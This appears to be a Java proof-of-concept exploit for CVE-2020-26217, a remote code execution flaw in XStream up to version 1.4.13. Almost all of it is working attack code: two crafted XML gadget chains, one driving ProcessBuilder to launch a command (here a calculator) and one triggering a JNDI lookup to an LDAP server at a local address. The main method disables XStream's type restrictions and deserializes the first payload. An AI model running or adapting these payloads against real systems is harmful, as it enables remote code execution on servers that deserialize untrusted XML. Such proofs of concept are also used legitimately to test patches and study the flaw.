package org.example;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.security.AnyTypePermission;

/**
 * RCE ImageIO ProcessBuilder/JdbcRowSetImpl JNDI <= 1.4.13
 */
public class CVE_2020_26217 {
    public static void main(String[] args) {
        String xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='java.io.SequenceInputStream'>\n" +
                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
                "                  <iter class='java.util.ArrayList$Itr'>\n" +
                "                    <cursor>0</cursor>\n" +
                "                    <lastRet>-1</lastRet>\n" +
                "                    <expectedModCount>1</expectedModCount>\n" +
                "                    <outer-class>\n" +
                "                      <java.lang.ProcessBuilder>\n" +
                "                        <command>\n" +
                "                          <string>open</string>\n" +
                "                          <string>-a</string>\n" +
                "                          <string>Calculator.app</string>\n" +
                "                        </command>\n" +
                "                      </java.lang.ProcessBuilder>\n" +
                "                    </outer-class>\n" +
                "                  </iter>\n" +
                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
                "                    <method>\n" +
                "                      <class>java.lang.ProcessBuilder</class>\n" +
                "                      <name>start</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>start</name>\n" +
                "                  </filter>\n" +
                "                  <next/>\n" +
                "                </iterator>\n" +
                "                <type>KEYS</type>\n" +
                "              </e>\n" +
                "              <in class='java.io.ByteArrayInputStream'>\n" +
                "                <buf></buf>\n" +
                "                <pos>0</pos>\n" +
                "                <mark>0</mark>\n" +
                "                <count>0</count>\n" +
                "              </in>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";


        String xml2 ="<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n" +
                "        <dataHandler>\n" +
                "          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n" +
                "            <is class=\"javax.crypto.CipherInputStream\">\n" +
                "              <cipher class=\"javax.crypto.NullCipher\">\n" +
                "                <initialized>false</initialized>\n" +
                "                <opmode>0</opmode>\n" +
                "                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n" +
                "                  <iter class=\"javax.imageio.spi.FilterIterator\">\n" +
                "                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n" +
                "                    <next class=\"com.sun.rowset.JdbcRowSetImpl\" serialization=\"custom\">\n" +
                "                      <javax.sql.rowset.BaseRowSet>\n" +
                "                        <default>\n" +
                "                          <concurrency>1008</concurrency>\n" +
                "                          <escapeProcessing>true</escapeProcessing>\n" +
                "                          <fetchDir>1000</fetchDir>\n" +
                "                          <fetchSize>0</fetchSize>\n" +
                "                          <isolation>2</isolation>\n" +
                "                          <maxFieldSize>0</maxFieldSize>\n" +
                "                          <maxRows>0</maxRows>\n" +
                "                          <queryTimeout>0</queryTimeout>\n" +
                "                          <readOnly>true</readOnly>\n" +
                "                          <rowSetType>1004</rowSetType>\n" +
                "                          <showDeleted>false</showDeleted>\n" +
                "                          <dataSource>ldap://127.0.0.1:23457/Command8</dataSource>\n" +
                "                          <listeners/>\n" +
                "                          <params/>\n" +
                "                        </default>\n" +
                "                      </javax.sql.rowset.BaseRowSet>\n" +
                "                      <com.sun.rowset.JdbcRowSetImpl>\n" +
                "                        <default>\n" +
                "                          <iMatchColumns>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                          </iMatchColumns>\n" +
                "                          <strMatchColumns>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                          </strMatchColumns>\n" +
                "                        </default>\n" +
                "                      </com.sun.rowset.JdbcRowSetImpl>\n" +
                "                    </next>\n" +
                "                  </iter>\n" +
                "                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n" +
                "                    <method>\n" +
                "                      <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                "                      <name>getDatabaseMetaData</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>foo</name>\n" +
                "                  </filter>\n" +
                "                  <next class=\"string\">foo</next>\n" +
                "                </serviceIterator>\n" +
                "                <lock/>\n" +
                "              </cipher>\n" +
                "              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n" +
                "              <ibuffer></ibuffer>\n" +
                "              <done>false</done>\n" +
                "              <ostart>0</ostart>\n" +
                "              <ofinish>0</ofinish>\n" +
                "              <closed>false</closed>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "</map>";

        System.out.println(xml);
        XStream xstream = new XStream();
        xstream.addPermission(AnyTypePermission.ANY);
        xstream.fromXML(xml);
    }

}
